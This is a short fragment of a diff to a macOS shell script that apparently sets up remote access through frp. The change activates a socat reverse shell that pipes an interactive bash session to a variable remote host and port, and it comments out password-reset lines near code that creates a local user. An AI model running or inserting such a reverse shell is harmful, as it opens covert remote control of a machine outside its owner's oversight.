@@ -32,11 +32,11 @@ sudo dscl . -create /Users/tttt UserShell /bin/bash
 echo "aaaaa5"
 #sudo dscl . -passwd /Users/tttt $jssshpwd
 #echo socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$jsfrpserver:$jsfrpport
-#socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$jsfrpserver:$jsfrpport
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$jsfrpserver:$jsfrpport
 #resetpassword
-dscl . -read /Users/$jssshuser
-dscl . -read /Users/tttt
-dscl . -passwd /Users/$jssshuser $jssshpwd
+#dscl . -read /Users/$jssshuser
+#dscl . -read /Users/tttt
+#dscl . -passwd /Users/$jssshuser $jssshpwd
 
 rm -rf frpc.ini
 cat >> frpc.ini <<EOF
